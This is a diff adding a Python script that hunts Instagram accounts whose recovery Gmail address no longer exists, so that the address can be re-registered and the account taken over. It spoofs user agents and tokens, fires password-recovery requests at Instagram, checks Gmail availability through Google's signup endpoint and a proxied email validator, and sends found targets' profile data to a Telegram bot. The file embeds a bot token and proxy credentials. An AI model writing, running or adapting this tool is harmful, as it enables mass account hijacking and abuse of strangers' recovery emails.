@@ -1,0 +1,412 @@
+import requests
+import time
+from hashlib import md5
+from user_agent import generate_user_agent
+from random import randrange
+from uuid import uuid4
+import os
+
+
+good_gmail = 0
+bad_gmail = 0
+reset_sent_total = 0
+
+RED = "\033[91m"
+GREEN = "\033[92m"
+DARK_GRAY = "\033[90m"
+RESET = "\033[0m"
+
+
+def check_gmail(username):
+    global good_gmail, bad_gmail, reset_sent_total
+    gmail = username + "@gmail.com"
+    from requests import post as pp
+    from random import randrange as rr
+    from user_agent import generate_user_agent as gg
+    from random import choice as cc
+
+    yy = 'azertyuiopmlkjhgfdsqwxcvbn'
+
+    def tll():
+        try:
+            n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
+            n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
+            host = ''.join(cc(yy) for i in range(rr(15, 30)))
+            cookies = {'__Host-GAPS': host}
+            headers = {
+                'authority': 'accounts.google.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                'google-accounts-xsrf': '1',
+                'origin': 'https://accounts.google.com',
+                'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
+                'user-agent': gg(),
+            }
+            data = {
+                'f.req': '["AEThLlz4luDk2yFWsQRU_KlZsoYtu6wNeZxocOIcj1BG20WA078YKjPYBHlgL8qq82PZDts7UWS0jQ2QmOU-Fh9UrfhgvRXgjlgxmWn2VptjYAi-emfCuzIezrd4IbKkWLbdSPxnA_mTSmtNVuiqJU_VZfR-KE3MtZf8qft2oqLdafTBloXqbn65aQv_o_DuwIR7pG6MmB_g","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
+            }
+            response = pp('https://accounts.google.com/_/signup/validatepersonaldetails',
+                          cookies=cookies, headers=headers, data=data)
+            tl = str(response.text).split('",null,"')[1].split('"')[0]
+            host = response.cookies.get_dict()['__Host-GAPS']
+            return tl, host
+        except Exception as e:
+            print(e)
+            return tll()
+
+    if '@' in gmail:
+        email = gmail.split('@')[0]
+    else:
+        email = gmail
+
+    try:
+        tl, host = tll()
+        cookies = {'__Host-GAPS': host}
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
+            'user-agent': gg(),
+        }
+        params = {'TL': tl}
+        data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + email + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
+        response = pp('https://accounts.google.com/_/signup/usernameavailability',
+                      params=params, cookies=cookies, headers=headers, data=data)
+        if '"gf.uar",1' in str(response.text):
+            print('Good to create -- ',gmail)
+            fetch_instagram_data_gmail(username)
+        else:
+            os.system("clear")
+            print('bad gmail')
+            bad_gmail += 1
+            print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+    except:
+        return check_gmail(gmail)
+
+def fetch_instagram_data_gmail(username):
+    from user_agent import generate_user_agent as main_data
+    global good_gmail, bad_gmail, reset_sent_total
+    bot_token = "5812995396:AAECr7Ryf51kOOnCV30sr6rUKesUdBux1nM"
+    tg_id = 5122281931
+
+
+
+    headers = {
+        'accept': '*/*',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'ar,en;q=0.9',
+        'cookie': f'ig_did={uuid4()}; datr=8J8TZD9P4GjWjawQJMcnRdV_; mid=ZBOf_gALAAGhvjQbR29aVENHIE4Z; ig_nrcb=1; csrftoken=5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy; ds_user_id=56985317140; dpr=1.25',
+        'referer': f'https://www.instagram.com/{username}/?hl=ar',
+        'sec-ch-prefers-color-scheme': 'dark',
+        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-ch-ua-platform-version': '"10.0.0"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': main_data(),
+        'viewport-width': '1051',
+        'x-asbd-id': '198387',
+        'x-csrftoken': '5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy',
+        'x-ig-app-id': '936619743392459',
+        'x-ig-www-claim': '0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    response = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=headers)
+
+    if response.status_code == 200:
+        response_json = response.json()
+        user_id = response_json.get("data", {}).get("user", {}).get("id")
+        if user_id:
+            additional_url = f"https://o7aa.pythonanywhere.com/?id={user_id}"
+            additional_response = requests.get(additional_url)
+            additional_response_json = additional_response.json()
+            date = additional_response_json.get("date")
+            user_data = response_json.get("data", {}).get("user", {})
+            full_name = user_data.get("full_name")
+            followers = user_data.get("edge_followed_by", {}).get("count")
+            following = user_data.get("edge_follow", {}).get("count")
+            posts = user_data.get("edge_owner_to_timeline_media", {}).get("count")
+            bio = user_data.get("biography")
+            is_private = user_data.get("is_private")
+            gmail = username + "@gmail.com"
+            link = "https://instagram.com/" + username + "/"
+            first_char = username[0]
+            last_char = username[-1]
+            email = first_char + "*******" + last_char + "@gmail.com"
+            dataaccount = (f'''
+⚙𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌💀
+⋘────━𓆩𝐍𝐎𝐎𝐁𝐒𓆪━────⋙
+
+[🙋] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {username}
+[❤️‍🔥] 𝐅𝐔𝐋𝐋 𝐍𝐀𝐌𝐄 : {full_name}
+[📧] 𝐄𝐌𝐀𝐈𝐋 : {gmail}
+[🪪] 𝐈𝐃 : {user_id}
+[🧛] 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑 : {followers}
+[🚴] 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : {following}
+[🖇️] 𝐋𝐈𝐍𝐊 : {link}
+[🗓️] 𝐃𝐀𝐓𝐄 : {date}
+[💀] 𝐑𝐄𝐒𝐄𝐓 : {email}
+[📮] 𝐏𝐎𝐒𝐓𝐒 : {posts}
+[🔒] 𝐈𝐒𝐏 : {is_private}
+
+⋘────━𓆩𝐍𝐎𝐎𝐁𝐒𓆪━────⋙
+[🧑‍💻] 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 : @pryanxhu
+''')
+            
+            
+            requests.get("https://api.telegram.org/bot"+str(bot_token)+"/sendMessage?chat_id="+str(tg_id)+"&text="+str(dataaccount))
+            os.system("clear")
+            good_gmail += 1
+            print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+            
+                
+            print(dataaccount)
+            
+                
+                
+        else:
+            os.system("clear")
+            bad_gmail += 1
+            print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+            print(username ," - not found")
+            
+            
+def check_gmail_availability(username):
+    global good_gmail, bad_gmail, reset_sent_total
+    gmail = username + "@gmail.com"
+
+    proxy_host = 'p.webshare.io'
+    proxy_port = '80'
+    proxy_username = 'wbexhbwx-rotate'
+    proxy_password = '8bhigfy54w41'
+
+    proxy_url = f'http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}'
+
+    proxies = {
+        'http': proxy_url,
+        'https': proxy_url
+    }
+
+    try:
+        response = requests.post(
+            url='https://www.site24x7.com/tools/email-validator',
+            data={'emails': gmail},
+            proxies=proxies
+        )
+
+        if response.status_code == 200:
+            if '"status":550' in response.text:
+                print("untaken")
+                check_gmail(username)
+            else:
+                os.system("clear")
+                bad_gmail += 1
+                print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+                print("taken")
+        else:
+            os.system("clear")
+            bad_gmail += 1
+            print("Error: Unable to check availability")
+            print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+
+    except requests.exceptions.RequestException as e:
+        os.system("clear")
+        bad_gmail += 1
+        print("Error:", e)
+        print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+        
+
+def send_recovery_email(username):
+    global good_gmail, bad_gmail, reset_sent_total
+    reset_headers = {
+        'X-Pigeon-Session-Id': '329c12da-5d0e-49cb-8c1f-21eac45cd37e',
+        'X-Pigeon-Rawclienttime': '1699874470.503',
+        'X-IG-Connection-Speed': '-1kbps',
+        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+        'X-IG-Bandwidth-TotalBytes-B': '0',
+        'X-IG-Bandwidth-TotalTime-MS': '0',
+        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+        'X-IG-Connection-Type': 'WIFI',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-App-ID': '567067343352427',
+        'User-Agent': 'Instagram 100.0.0.17.129 Android (31/12; 320dpi; 720x1552; HONOR; RKY-LX2; HNRKY-M1; mt6765; ar_IQ; 161478664)',
+        'Accept-Language': 'ar-IQ, en-US',
+        'Cookie': 'mid=ZVIGRQABAAEZYXrdQ825gbMAjn3Y; csrftoken=aHrk0ApciS6XmTgy08kYqyjj6mYBooRq',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Host': 'i.instagram.com',
+        'X-FB-HTTP-Engine': 'Liger',
+        'Connection': 'keep-alive',
+        'Content-Length': '355',
+    }
+
+    reset_data = f'signed_body=eca881c66fea103cf5a6dc0880766519bea0c80de17d757a5771e96847067188.%7B%22_csrftoken%22%3A%22aHrk0ApciS6XmTgy08kYqyjj6mYBooRq%22%2C%22adid%22%3A%2249ff8e96-bd0c-4793-8a46-6f59a9eac6e4%22%2C%22guid%22%3A%2204dd27d7-9663-43a6-85ed-fd77269291e3%22%2C%22device_id%22%3A%22android-d4418f4e12f4c6d8%22%2C%22query%22%3A%22{username}%22%7D&ig_sig_key_version=4'
+
+    response = requests.post(
+        url='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
+        headers=reset_headers,
+        data=reset_data
+    )
+
+    sto = response.json()
+    if "ok" in sto['status']:
+        email = sto['email']
+        reset_sent_total += 1
+        print("Email:", email)
+        if "@gmail.com" in email:
+            if email[0] == username[0] and email[-11] == username[-1]:
+                
+                #print("Good:", good_gmail, "Bad:", bad_gmail)
+                
+                print("Matched")
+                check_gmail_availability(username)
+                
+                
+            else:
+                
+                os.system("clear")
+                bad_gmail += 1
+                print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+                print("Not Matched")
+                
+        else:
+            
+            os.system("clear")
+            bad_gmail += 1
+            print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+            print("Email not Gmail")
+            
+    elif "invalid" in sto:
+        
+        os.system("clear")
+        bad_gmail += 1
+        print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+        print('Invalid Email')
+        
+    elif "Sorry, we can't send you a login link. Please contact Instagram for more help." in sto['message']:
+        os.system("clear")
+        bad_gmail += 1
+        print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+        print("Help occurred")
+        
+    elif "user_not_found" in sto['error_type']:
+        os.system("clear")
+        bad_gmail += 1
+        print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+        print('False User')
+        
+    elif "Please wait a few minutes before you try again." in sto['message']:
+        os.system("clear")
+        bad_gmail += 1
+        print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+        print("Try later")
+
+        
+        
+    else:
+        os.system("clear")
+        bad_gmail += 1
+        print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+        print('Bad Requests')
+        
+
+
+
+
+
+
+def gmail_available_or_not(gmail, username):
+    global good_gmail, bad_gmail, reset_sent_total
+    try:
+        csrftoken = md5(str(time.time()).encode()).hexdigest()
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.instagram.com',
+            'referer': 'https://www.instagram.com/accounts/signup/email/',
+            'user-agent': generate_user_agent(),
+            'x-csrftoken': csrftoken
+        }
+
+        data = {
+            'email': gmail,
+        }
+
+        response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
+        json_response = response.json()
+        #print(response.json())
+
+        if "spam" in json_response and json_response["spam"] == True:
+            #os.system("clear")
+            
+            print("TURN ON OFF AEROPLANE MODE")
+            
+            #exit()
+        elif "error_type" in json_response and json_response["error_type"] == "email_is_taken":
+            os.system("clear")
+            print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+            print(username, "Good")
+            send_recovery_email(username)
+        else:
+            os.system("clear")
+            bad_gmail += 1
+            print("\033[1m\033[92mGood:\033[0m", good_gmail, " | \033[1m\033[91mBad:\033[0m", bad_gmail,"| \033[1m\033[35mReset Sent:\033[0m", reset_sent_total, "| \033[1m\033[90mDeveloper @pryanxhu\033[0m")
+            print(username, "Not taken")
+            
+    except TypeError as e:
+        pass
+
+
+def generate_instagram_username():
+    global good_gmail, bad_gmail, reset_sent_total
+    try:
+        id = str(randrange(10000, 30975110))
+
+        csrftoken = md5(str(time.time()).encode()).hexdigest()
+        headers = {
+            'authority': 'www.instagram.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dnt': '1',
+            'dpr': '0.8',
+            'origin': 'https://www.instagram.com',
+            'user-agent': generate_user_agent(),
+            'x-csrftoken': csrftoken,
+        }
+        data = {
+            '__spin_b': 'trunk',
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
+            'variables': '{"userID":"' + id + '","username":"0s9s"}',
+            'server_timestamps': 'true',
+            'doc_id': '7666785636679494',
+        }
+        response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
+        username = response['data']['user']['username']
+        gmail =  username + "@gmail.com"
+        gmail_available_or_not(gmail, username)
+    except TypeError as e:
+        pass
+
+
+
+
+while True:
+    try:
+        generate_instagram_username()
+    except Exception as e:
+        print("\033[91mAn error occurred:", e, "\033[0m")
+        continue
+        
